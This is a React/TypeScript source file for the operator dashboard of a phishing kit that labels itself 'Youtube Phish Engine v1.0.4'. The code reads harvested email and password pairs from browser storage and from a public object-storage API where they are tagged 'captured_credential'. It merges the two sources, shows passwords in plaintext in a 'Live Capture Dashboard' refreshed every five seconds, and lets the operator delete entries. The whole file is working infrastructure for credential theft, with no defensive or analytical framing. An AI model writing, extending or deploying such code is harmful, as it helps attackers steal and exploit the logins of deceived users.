
import React, { useState, useEffect } from 'react';
import { CapturedUser } from '../types';

interface AdminPanelProps {
  onBack: () => void;
}

interface UserWithSource extends CapturedUser {
  source: 'Local' | 'Cloud';
}

const API_ENDPOINT = 'https://api.restful-api.dev/objects';

const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [users, setUsers] = useState<UserWithSource[]>([]);
  const [loading, setLoading] = useState(true);
  const [lastSync, setLastSync] = useState<string>('');

  useEffect(() => {
    refreshData();
    const interval = setInterval(refreshData, 5000); // Fast refresh for testing
    return () => clearInterval(interval);
  }, []);

  const refreshData = async () => {
    setLoading(true);
    try {
      // 1. Get Local Data
      const localRaw = localStorage.getItem('captured_users');
      const localUsers: UserWithSource[] = JSON.parse(localRaw || '[]').map((u: any) => ({
        ...u,
        source: 'Local' as const
      }));

      // 2. Get Cloud Data
      let cloudUsers: UserWithSource[] = [];
      try {
        const response = await fetch(API_ENDPOINT);
        if (response.ok) {
          const rawData = await response.json();
          cloudUsers = (rawData as any[])
            .filter(item => item.data && item.data.type === 'captured_credential')
            .map(item => ({
              id: item.id,
              email: item.name,
              password: item.data.password,
              timestamp: item.data.timestamp,
              source: 'Cloud' as const
            }));
        }
      } catch (e) {
        console.warn('Cloud fetch failed, showing local data only');
      }

      // 3. Merge & Deduplicate (by email + password combination)
      const mergedMap = new Map<string, UserWithSource>();
      
      // Local takes precedence for same combo
      localUsers.forEach(u => mergedMap.set(`${u.email}-${u.password}`, u));
      // Cloud added if not already present
      cloudUsers.forEach(u => {
        const key = `${u.email}-${u.password}`;
        if (!mergedMap.has(key)) {
          mergedMap.set(key, u);
        }
      });

      const finalUsers = Array.from(mergedMap.values()).sort((a, b) => b.timestamp - a.timestamp);
      setUsers(finalUsers);
      setLastSync(new Date().toLocaleTimeString());
    } catch (err) {
      console.error('Refresh error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleClearLocal = () => {
    if (window.confirm('Clear your local device logs?')) {
      localStorage.removeItem('captured_users');
      refreshData();
    }
  };

  const handleDelete = async (user: UserWithSource) => {
    if (!window.confirm(`Delete ${user.email}?`)) return;

    if (user.source === 'Local') {
      const existing = JSON.parse(localStorage.getItem('captured_users') || '[]');
      const filtered = existing.filter((u: any) => u.id !== user.id);
      localStorage.setItem('captured_users', JSON.stringify(filtered));
    } else {
      try {
        await fetch(`${API_ENDPOINT}/${user.id}`, { method: 'DELETE' });
      } catch (e) {
        alert('Could not delete from cloud (public objects are often read-only)');
      }
    }
    refreshData();
  };

  return (
    <div className="bg-white border border-[#dadce0] rounded-2xl shadow-2xl p-6 sm:p-10 max-h-[90vh] flex flex-col w-full max-w-6xl mx-auto overflow-hidden">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b pb-6 mb-6">
        <div>
          <h2 className="text-3xl font-bold text-[#202124] tracking-tight flex items-center gap-3">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
            </span>
            Live Capture Dashboard
          </h2>
          <div className="flex items-center gap-3 mt-2">
             <span className="text-xs font-semibold text-blue-600 bg-blue-50 px-2 py-1 rounded border border-blue-100">
              {users.length} Total Users Captured
            </span>
            <span className="text-[11px] text-[#5f6368] font-mono">
              Last Check: {lastSync}
            </span>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <button 
            onClick={handleClearLocal}
            className="text-[#d93025] hover:bg-red-50 px-4 py-2 rounded-lg text-sm font-medium transition-colors border border-transparent hover:border-red-100"
          >
            Clear Local
          </button>
          <button 
            onClick={onBack}
            className="bg-[#1a73e8] text-white px-6 py-2.5 rounded-xl font-bold text-sm hover:bg-[#174ea6] transition-all shadow-lg active:scale-95"
          >
            Exit Dashboard
          </button>
        </div>
      </div>

      <div className="overflow-y-auto flex-grow rounded-xl border border-gray-100 shadow-inner bg-gray-50/50">
        <table className="w-full text-left">
          <thead className="sticky top-0 bg-white shadow-sm z-20">
            <tr className="text-[#5f6368] text-[11px] font-black uppercase tracking-[0.1em] border-b">
              <th className="py-4 px-6">Source</th>
              <th className="py-4 px-6">Captured Account</th>
              <th className="py-4 px-6">Password</th>
              <th className="py-4 px-6">Timestamp</th>
              <th className="py-4 px-6 text-right">Delete</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-gray-100">
            {users.length === 0 ? (
              <tr>
                <td colSpan={5} className="py-32 text-center">
                  <div className="flex flex-col items-center gap-4">
                    <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center text-gray-400">
                      <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4" /></svg>
                    </div>
                    <p className="text-[#5f6368] font-bold text-lg">No Credentials Found</p>
                    <p className="text-sm text-gray-400 max-w-xs">Perform a login in the main app to see data appear here in real-time.</p>
                  </div>
                </td>
              </tr>
            ) : (
              users.map(user => (
                <tr key={user.id} className="hover:bg-blue-50/40 transition-colors group bg-white">
                  <td className="py-5 px-6">
                    <span className={`text-[10px] font-black uppercase px-2 py-1 rounded-full border ${
                      user.source === 'Local' 
                        ? 'bg-purple-50 text-purple-600 border-purple-100' 
                        : 'bg-green-50 text-green-600 border-green-100'
                    }`}>
                      {user.source}
                    </span>
                  </td>
                  <td className="py-5 px-6">
                    <div className="flex items-center gap-3">
                      <div className="w-9 h-9 rounded-full bg-gradient-to-tr from-blue-600 to-blue-400 flex items-center justify-center text-white font-bold text-sm shadow-md">
                        {user.email.charAt(0).toUpperCase()}
                      </div>
                      <span className="text-sm font-bold text-[#202124]">{user.email}</span>
                    </div>
                  </td>
                  <td className="py-5 px-6">
                    <code className="text-xs bg-red-50 text-red-600 px-3 py-1.5 rounded-lg border border-red-100 font-mono font-black shadow-sm group-hover:bg-red-600 group-hover:text-white transition-colors">
                      {user.password}
                    </code>
                  </td>
                  <td className="py-5 px-6 text-xs text-[#5f6368] font-bold">
                    {new Date(user.timestamp).toLocaleString([], { dateStyle: 'short', timeStyle: 'short' })}
                  </td>
                  <td className="py-5 px-6 text-right">
                    <button 
                      onClick={() => handleDelete(user)}
                      className="text-gray-300 hover:text-red-500 p-2 rounded-xl hover:bg-red-50 transition-all opacity-0 group-hover:opacity-100"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
      
      <div className="mt-6 pt-4 border-t text-[10px] text-[#5f6368] flex justify-between items-center px-4">
        <div className="flex gap-4 font-bold uppercase tracking-tighter">
           <span className="flex items-center gap-1"><div className="w-1.5 h-1.5 bg-green-500 rounded-full"></div> Cloud Sync Active</span>
           <span className="flex items-center gap-1"><div className="w-1.5 h-1.5 bg-purple-500 rounded-full"></div> Local Buffer Active</span>
        </div>
        <p className="font-black italic">Youtube Phish Engine v1.0.4</p>
      </div>
    </div>
  );
};

export default AdminPanel;
